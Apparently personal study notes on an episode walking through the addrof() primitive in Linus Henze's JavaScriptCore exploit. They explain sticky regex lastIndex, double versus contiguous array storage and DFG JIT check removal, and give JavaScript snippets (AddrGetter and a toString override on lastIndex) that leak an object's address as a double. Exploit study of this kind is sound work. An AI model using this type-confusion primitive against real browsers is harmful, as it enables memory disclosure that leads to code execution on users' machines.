Ep 5 (addrof() walk-through)
-----------------------------
Episode talks about addrof function in Linus Henze's exploit that can leak a ptr to any object

Sticky Regex
-------------
The sticky property reflects whether or not the search is sticky 
(searches in STRINGS only from the index indicated by the lastIndex property of this regular expression).
so if last index is 1 and you search "abc", it will start searching on "bc"

Example:
reg = /abc/y
"abc".match(reg)  // succesful
"aabc".match(reg) // unsucessful

reg.lastIndex = 1
"abc".match(reg)  // unsuccesful
"aabc".match(reg) // sucessful

when you try to match a string with a sticky regex whose lastIndex is an object ,
--------------------
reg = /abc/y
reg.lastIndex = {}
"abc".match(reg)
--------------------
Internal regex code notices that lastIndex is not a number but an object, and tries to call toString to convert
the lastIndex 

How 2 leak addresses in js
---------------------------

(Simply speaking,make JITed function thinks that array is ArrayOfDouble when in reality array is ArrayOfContiguous)

In js,
a = [{},1337] (Array of contiguous)
a[0] will return [object Object]

a = [13.37] (Array of double)
a[0] will return 13.37

when javascript core knows that the array is an array of doubles,it will print everything in the array as doubles
when javascript core knows that the array is an array of contiguous,it will print elements depending on the NaN-encoding
if the NaN encoding signals that the element is a ptr/object,it will print it out in an object form


remember that when a function is DFG JITed, if it thinks that the type of something doesnt change,it will skip some checks

Example:

(DFG JITed)
function(array) {
    a = 1+2
    b = 2+3
    return array[0] 
}

DFG of course will think that array is the same type before and after the function is called
and will skip checks

(DFG JITed)
a = [13.37]
function(array) {
    array[0] = {}
    return array[0]
}

function(a)

DFG will know that the type of array before the function is called is ArrayOfDouble, and the type of array after the function is called is ArrayOfContiguous 
So checks will still be executed
(Certain functions that may change the layout/types of an array are also marked with clobberworld())

So to leak an address, you theoretically can:
-make a functionthat  is DFG JITed 
-let DFG think that the type of array is ArrayOfDoubles before and after the function so checks are removed
-write an object into the array and print out the object as a double

Regex memory leak
-------------------
In Linus's exploit, there is a function called AddrGetter which is DFG JITed

reg = /abc/y
var AddrGetter = function(array) {
    "abc".match(reg);
    return array[0];
}

The lastIndex of the regex is an object, and the object's toString method was modified

regexLastIndex = {};
regexLastIndex.toString = function() {
    array[0] = valToLeak;
    return "0";
};
reg.lastIndex = regexLastIndex;

AddrGetter(array)

DFG thinks that the array in AddrGetter is always gonna be ArrayOfDoubles
when match is called,internal regex code is gonna realise that lastIndex is not a number and call ToString on the object
toString changes the ArrayOfDoubles into an ArrayOfContiguous by inserting an object,
but AddrGetter still thinks that the array is an ArrayOfDoubles and returns the object in the form of a double
